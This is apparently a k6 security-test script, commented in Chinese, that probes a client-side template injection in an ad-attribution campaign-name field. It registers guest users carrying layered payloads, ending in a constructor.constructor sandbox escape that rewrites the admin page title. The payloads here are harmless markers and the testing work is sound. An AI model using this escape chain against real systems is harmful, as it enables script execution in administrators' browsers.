/**
 * FB归因字段 CSTI(客户端模板注入) 深挖探测——第二轮，不依赖alert弹窗
 *
 * 背景：第一轮注入测试发现 {{constructor.constructor("alert(1)")()}} 这个
 * payload导致 campaignName 字段显示为空值(--)，和其余19条payload"原样完整
 * 显示"的行为不一致——这是个异常信号，但alert()本身可能被浏览器/CSP静默
 * 拦截，无法区分"真的执行了只是没弹出来"还是"压根没执行、只是被某种机制
 * 清空了"。这轮换成能程序化验证的payload，分层诊断：
 *
 *   L0: {{7*7}}                —— 最基础、完全无害，只验证"这个值到底有没有
 *                                   被当作JS表达式求值"这个最根本的事实。如果
 *                                   显示"49"，100%证实存在CSTI；如果原样显示
 *                                   "{{7*7}}"文本，说明压根没有CSTI；如果显示
 *                                   空，和上次观察到的一致，但原因还不确定。
 *   L1: {{window.location.href}} —— 验证表达式求值能不能访问window全局对象，
 *                                   不涉及动态生成代码，用来区分"卡在哪一层"：
 *                                   如果L0通了但L1不通，说明沙箱只放行了纯算术，
 *                                   拦截了访问全局对象。
 *   L2: {{constructor.constructor('document.title="CSTI_POC_' + 一个唯一标记
 *       + '"')()}} —— 完整沙箱逃逸链路，如果真的执行会直接篡改页面标题，用
 *                       一个带时间戳的唯一标记，事后用浏览器读取tab标题即可
 *                       确认，比等alert弹窗可靠得多。
 *
 * 只读防御性安全探测，在SIT测试环境进行。
 *
 * 用法：k6 run -e TENANT_ID=3003 attributionCstiProbe.js
 */
import { sleep } from 'k6';
import { guestRegister, getLastRegisterError, TENANT_3003_FB_ATTRIBUTION } from '../login/register.test.js';
import { generateCryptoRandomString } from '../../utils/utils.js';

export const options = {
    scenarios: { v: { executor: 'per-vu-iterations', vus: 1, iterations: 1, maxDuration: '5m' } }
};

const MARK = 'CSTI_POC_' + Date.now();

const PAYLOADS = [
    { category: 'L0_pure_arithmetic', value: '{{7*7}}' },
    { category: 'L0_arithmetic_variant', value: '${7*7}' },
    { category: 'L1_window_access', value: '{{window.location.href}}' },
    { category: 'L2_full_sandbox_escape', value: `{{constructor.constructor('document.title="${MARK}"')()}}` }
];

export default function () {
    console.log(`\n${'='.repeat(70)}`);
    console.log(`  [CstiProbe] 客户端模板注入分层探测 | 标记=${MARK}`);
    console.log(`${'='.repeat(70)}\n`);

    const results = [];
    for (const p of PAYLOADS) {
        const attribution = { ...TENANT_3003_FB_ATTRIBUTION.adAttribution, campaignName: p.value };
        const result = guestRegister({
            ...TENANT_3003_FB_ATTRIBUTION,
            adAttribution: attribution,
            fbclid: `csti_${p.category}_${generateCryptoRandomString(8)}`
        });

        if (result && result.data && result.data.token) {
            const userId = result.data.userId;
            results.push({ category: p.category, value: p.value, userId });
            console.log(`[CstiProbe] ✅ ${p.category.padEnd(26, ' ')} userId=${userId}  value=${p.value}`);
        } else {
            const err = getLastRegisterError();
            console.log(`[CstiProbe] ❌ ${p.category.padEnd(26, ' ')} 被拒绝  ${JSON.stringify(err)}`);
        }
        sleep(0.3);
    }

    console.log(`\n${'='.repeat(70)}`);
    console.log(`  [CstiProbe] 汇总——去后台「广告归因记录」核对这几个userId的广告系列名称：`);
    console.log(`${'='.repeat(70)}`);
    for (const r of results) {
        console.log(`  ${String(r.userId).padEnd(10, ' ')} <- ${r.category}  (原始payload: ${r.value})`);
    }
    console.log(`\n  L2那条如果真的执行了，页面标题会变成含"${MARK}"的字符串，`);
    console.log(`  用浏览器打开归因记录页面后，直接读 document.title 核对即可，不用等弹窗。`);
    console.log(`${'='.repeat(70)}\n`);
}
